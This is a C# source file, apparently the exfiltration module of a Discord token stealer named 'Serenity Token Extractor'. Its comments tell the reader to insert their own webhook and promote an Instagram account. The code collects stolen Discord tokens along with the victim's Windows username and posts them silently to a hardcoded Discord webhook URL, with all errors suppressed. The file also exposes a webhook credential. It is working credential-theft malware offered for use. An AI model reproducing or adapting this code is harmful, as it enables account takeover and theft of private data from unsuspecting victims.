//Discord Token Extractor
//Replace the hookurl with your WebHook
//Follow @sprx.sh on Instagram

using System;
using System.Collections.Generic;
using System.Net.Http;

namespace SerenityExtractor
{
    public static class Webhook
    {
        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/671874195558498334/Yn359SJ-2RJF_d-GxzqLtBz3ifGEcZOGT3Ul4WJ2trdXN4oq4LPkDSCFz7EEeedkL-o0";

        public static void ReportTokens(List<string> tokenReport)
        {
            try
            {
                HttpClient client = new HttpClient();
                Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"Token(s) For '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
                        { "username", "Serenity Token Extractor" },
                        { "avatar_url", "https://i.imgur.com/PdLhseK.png" }
                    };

                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
            }
            catch { }
        }
    }
}
